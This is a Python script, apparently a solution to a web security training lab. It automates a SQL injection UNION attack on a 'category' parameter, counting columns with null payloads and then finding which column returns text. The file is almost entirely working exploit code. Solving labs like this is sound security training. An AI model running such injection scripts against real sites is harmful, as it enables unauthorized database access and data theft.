"""
  Lab: SQL injection UNION attack, finding a column containing text

  Steps:
  1. Inject payload into 'category' query parameter to determine the number of columns
  2. Add one additional null column at a time
  3. Repeat this process, increasing the number of columns until you receive a valid response
  4. After determining the number of columns, replace each column with the desired text one at a time
  5. Repeat this process until you receive a valid response

  Author: N00BCYB0T
"""
import argparse
import requests
from colorama import Fore
import re
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-u', "--url", required=True, help='Target URL')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    args = parser.parse_args()

    # Configure session with proxy if provided
    session = requests.session()
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        session.proxies = proxies
    session.verify = False

    print("⦗#⦘ Injection parameter: " + Fore.YELLOW + "category")

    main_page = fetch("/", session, args.url)

    target_text = re.findall("Make the database retrieve the string: '(.*)'", main_page.text)[0]

    for counter in range(1, 10):
        nulls = "null, " * counter
        payload = f"' UNION SELECT {nulls}-- -".replace(", -- -", "-- -") # remove the last comma
        
        print(Fore.WHITE + f"❯❯ Trying payload: {payload}")
        
        injection_response = fetch(f"/filter?category={payload}", session, args.url)

        if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response):
            print(Fore.WHITE + "⦗#⦘ Number of columns: " + Fore.GREEN + str(counter))
            
            for column in range(1, counter+1):
                # Replace each null with the target text one at a time
                new_payload = payload.replace("null", f"'{target_text}'", column).replace(f"'{target_text}'", "null", column-1)
    
                print(Fore.WHITE + f"❯❯ Trying payload: {new_payload}")
                
                injection_response = fetch(f"/filter?category={new_payload}", session, args.url)
        
                if text_not_exist_in_response("<h4>Internal Server Error</h4>", injection_response):
                    print(Fore.WHITE + "⦗#⦘ the column containing text: " + Fore.GREEN + str(column))
                    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")
                    
                    break
                
                else:
                    continue
            
            break
        else:
            continue
    
def fetch(path, session, url, cookies = None):
    try:  
        return session.get(f"{url}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)

def text_not_exist_in_response(text, response):
    result =  re.findall(text, response.text)
    if len(result) == 0:
        return True
    else:
        return False 

if __name__ == "__main__":
    main()